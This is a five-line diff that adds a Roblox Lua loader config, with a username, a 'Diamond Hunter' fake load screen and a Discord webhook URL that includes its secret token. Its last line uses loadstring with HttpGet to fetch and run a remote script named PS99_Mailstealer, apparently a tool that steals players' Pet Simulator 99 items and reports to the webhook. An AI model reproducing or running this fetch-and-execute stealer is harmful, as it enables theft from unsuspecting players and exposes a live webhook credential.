@@ -1,0 +1,5 @@
+Username = "binengpogi"
+LoadScreen = Diamond Hunter
+Webhook = "https://discord.com/api/webhooks/1241348879828520990/5cu107CEpE1Gvs-n8S3YO_AXqukL1F6kgQQctG8McxZo5JvXS9VO5ewvmUeVis-RnsRt" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
